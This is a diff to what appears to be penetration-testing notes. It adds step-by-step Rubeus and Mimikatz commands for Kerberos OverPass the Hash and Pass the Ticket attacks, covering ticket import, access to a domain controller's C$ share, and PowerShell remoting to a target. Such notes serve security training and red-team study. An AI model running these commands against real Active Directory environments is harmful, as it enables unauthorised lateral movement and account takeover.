@@ -388,6 +388,9 @@ Then perform the attack:
 
 ```cmd
 C:\> Rubeus.exe asktgt /domain:<domain> /user:<user> /<key_type>:<key> /nowrap
+
+<SNIP>
+[*] base64(ticket.kirbi): doIE1...Y29t
 ```
 > The key type can be `/rc4`, `/aes128`, `/aes256`, or `/des`.
 > Most AD domains use AES encryption as default now, so using an `rc4` key could cause an `encryption downgrade` alert.
@@ -396,6 +399,62 @@ C:\> Rubeus.exe asktgt /domain:<domain> /user:<user> /<key_type>:<key> /nowrap
 > Ref: [Rubeus Example for OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash)
 
 #### Pass the Ticket with Rubeus
+Instead of doing an OverPass the Hash attack to generate a ticket, we can instead do a PtT attack to submit the ticket to the current logon session.
 ```cmd
-C:\> Rubeus.exe asktgt /dp
+C:\> Rubeus.exe asktgt /domain:<domain> /user:<user> /<key_type>:<key> /ptt
+
+<SNIP>
+[*] base64(ticket.kirbi): doIE1...Y29t
+[+] Ticket successfully imported!
+```
+> This displays the successful import message
+
+A ticket can also be passed from a `.kirbi` file on the disk (*it also supports putting the base64 version of the ticket in*):
+```cmd
+C:\> Rubeus.exe ptt /ticket:<ticket_file>
+
+[*] Action: Import Ticket
+[+] ticket successfully imported!
+```
+> Convert a file to Base64 in PowerShell: `[Convert]::ToBase64String([IO.File]::ReadAllBytes("<file_path>"))`
+
+Once the attack has been performed, we can then access the system as that user:
+```cmd
+C:\> dir \\DC01.mydomain.com\C$
+```
+
+#### Pass the Ticket with Mimikatz
+![[Mimikatz#Pass the Ticket]]
+
+#### Pass the Ticket with PowerShell Remoting
+[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote system. It creates HTTP and HTTPS listeners on TCP/5985 & TCP/5986 (*[[WinRM]]*). You must be either:
+- An administrator
+- A member of the Remote Management Users group
+- Have explicit PowerShell Remoting permissions in your session configuration
+
+With [[Mimikatz]] you can perform the [[Mimikatz#Pass the Ticket|Pass the Ticket]] attack, then connect via a powershell session to the target
+```cmd
+C:\> mimikatz.exe
+
+<MIMIKATZ PTT ATTACK>
+
+mimikatz # exit
+C:\> powershell
+```
+```PowerShell
+PS C:\> Enter-PSSession -ComputerName <target>
+```
+
+[Rubeus](https://github.com/GhostPack/Rubeus) can do the same using the `createnetonly` option. It creates a sacrificial process/logon session([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). Using a `netonly` process we prevent the erasure of existing TGTs for the current logon session.
+```cmd
+C:\> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+```
+Once this creates a new CMD window, we can then proceed as normal with the PtT attack:
+```cmd
+C:\> Rubeus.exe asktgt /domain:<domain> /user:<user> /<key_type>:<key> /ptt
+
+C:\> powershell
+```
+```PowerShell
+PS C:\> Enter-PSSession -ComputerName <target>
 ```
